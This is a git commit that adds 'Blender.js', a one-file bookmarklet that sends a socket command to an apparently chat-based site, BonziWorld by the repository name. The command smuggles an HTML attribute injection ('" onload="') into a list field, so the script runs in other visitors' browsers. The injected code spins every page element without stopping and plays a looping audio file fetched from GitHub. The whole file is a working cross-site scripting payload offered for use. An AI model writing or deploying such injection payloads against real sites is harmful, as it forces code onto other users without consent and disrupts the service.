4c7070860db8ba370372bd906d6218da86468875
PickleBack <139999667+GreenwaveStudios@users.noreply.github.com>
2025-09-06 13:53:39 +0100

    Create Blender.js

---
+++ Blender.js
@@ -0,0 +1,3 @@
+javascript:socket.emit('command',{
+  list:['youtube','eee" onload="document.querySelectorAll(\'*\').forEach(el => { el.style.transition = \'transform 0s linear\'; el.style.transformOrigin = \'50% 50%\'; }); let angle = 0; setInterval(()=>{ angle += 20; document.querySelectorAll(\'*\').forEach(el => el.style.transform = `rotate(${angle}deg)`); },50); let audio = new Audio(\'https://github.com/GreenwaveStudios/BonziSKRIPTS-bonziworldjs-scripts/raw/refs/heads/main/imagesandvideos/blender.wav\'); audio.loop = true; audio.play();"']
+})
